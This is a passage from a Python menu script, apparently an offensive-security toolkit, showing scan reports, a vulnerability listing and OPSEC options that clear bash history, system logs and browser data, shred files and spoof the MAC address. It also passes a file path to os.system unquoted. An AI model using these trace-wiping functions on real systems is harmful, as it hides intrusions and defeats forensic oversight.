                
                if scans:
                    latest_scan = scans[0]
                    scan_data = json.loads(latest_scan[4])
                    
                    print(f"\n{Colors.YELLOW}[*] Generating reports...{Colors.RESET}")
                    ReportGenerator.generate_html_report(target, {'vulnerabilities': [], 'ports': scan_data})
                    ReportGenerator.generate_json_report(target, {'vulnerabilities': [], 'ports': scan_data})
                else:
                    print(f"{Colors.RED}[!] No scan data found for {target}{Colors.RESET}")
                
            elif choice == '22':
                target = input(f"{Colors.CYAN}Target (or press Enter for all): {Colors.RESET}")
                scans = db.get_scan_history(target if target else None)
                
                print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.BOLD}Scan History{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
                
                for scan in scans[:20]:
                    print(f"{Colors.GREEN}[{scan[3]}]{Colors.RESET} {scan[1]} - {scan[2]}")
                
            elif choice == '23':
                vulns = db.get_vulnerabilities()
                
                print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.BOLD}Vulnerabilities Database{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
                
                severity_colors = {
                    'CRITICAL': Colors.RED,
                    'HIGH': Colors.MAGENTA,
                    'MEDIUM': Colors.YELLOW,
                    'LOW': Colors.BLUE
                }
                
                for vuln in vulns[:50]:
                    color = severity_colors.get(vuln[3], Colors.WHITE)
                    print(f"{color}[{vuln[3]}]{Colors.RESET} {vuln[1]} - {vuln[2]}")
                    print(f"  {vuln[4]}")
                    print(f"  {Colors.CYAN}[{vuln[5]}]{Colors.RESET}\n")
                
            elif choice == '24':
                print(f"{Colors.YELLOW}[*] Updating system and security tools...{Colors.RESET}\n")
                os.system('sudo apt update')
                print()
                os.system('sudo apt upgrade -y')
                print()
                print(f"{Colors.GREEN}[+] Update complete{Colors.RESET}")
                
            elif choice == '25':
                print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
                print(f"{Colors.BOLD}Session Logs{Colors.RESET}")
                print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
                os.system(f'cat {logger.session_file}')
                
            elif choice == '26':
                print(f"\n{Colors.CYAN}Configuration{Colors.RESET}\n")
                print(f"Threads: {CONFIG['threads']}")
                print(f"Timeout: {CONFIG['timeout']}s")
                print(f"Database: {CONFIG['db_path']}")
                print(f"Log Directory: {CONFIG['log_dir']}")
                print(f"Reports Directory: {CONFIG['reports_dir']}")
                print(f"Wordlists Directory: {CONFIG['wordlists_dir']}")
                
                modify = input(f"\n{Colors.CYAN}Modify settings? (y/n): {Colors.RESET}")
                if modify.lower() == 'y':
                    threads = input(f"{Colors.CYAN}Threads (current: {CONFIG['threads']}): {Colors.RESET}")
                    if threads.isdigit():
                        CONFIG['threads'] = int(threads)
                    
                    timeout = input(f"{Colors.CYAN}Timeout (current: {CONFIG['timeout']}): {Colors.RESET}")
                    if timeout.isdigit():
                        CONFIG['timeout'] = int(timeout)
                    
                    print(f"{Colors.GREEN}[+] Configuration updated{Colors.RESET}")
                
            elif choice == '27':
                OPSECTools.full_cleanup()
                
            elif choice == '28':
                OPSECTools.clear_bash_history()
                
            elif choice == '29':
                OPSECTools.clear_system_logs()
                
            elif choice == '30':
                OPSECTools.clear_browser_data()
                
            elif choice == '31':
                OPSECTools.clear_dns_cache()
                
            elif choice == '32':
                filepath = input(f"{Colors.CYAN}File path to shred: {Colors.RESET}")
                passes = input(f"{Colors.CYAN}Number of passes (default 3): {Colors.RESET}")
                passes = int(passes) if passes.isdigit() else 3
                OPSECTools.shred_file(filepath, passes)
                
            elif choice == '33':
                OPSECTools.anonymize_mac()
                
            elif choice == '34':
                OPSECTools.check_for_traces()
            
            elif choice == '0':
                print(f"\n{Colors.GREEN}[+] Closing database connection...{Colors.RESET}")
                db.close()
                print(f"{Colors.GREEN}[+] Thank you for using Parrot OS Cybersecurity Suite!{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] Stay ethical and always get permission before testing!{Colors.RESET}\n")
                sys.exit(0)
            
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.RESET}")
            
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
            input(f"{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            logger.log(f"Error: {e}", "ERROR")
            input(f"{Colors.CYAN}Press Enter to continue...{Colors.RESET}")

if __name__ == "__main__":
    # Check for root privileges
    check_root()
    
    # Display banner and start
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Shutdown signal received{Colors.RESET}")
        db.close()
        print(f"{Colors.GREEN}[+] Database closed. Goodbye!{Colors.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Fatal error: {e}{Colors.RESET}")
        logger.log(f"Fatal error: {e}", "ERROR")
        db.close()
        sys.exit(1)
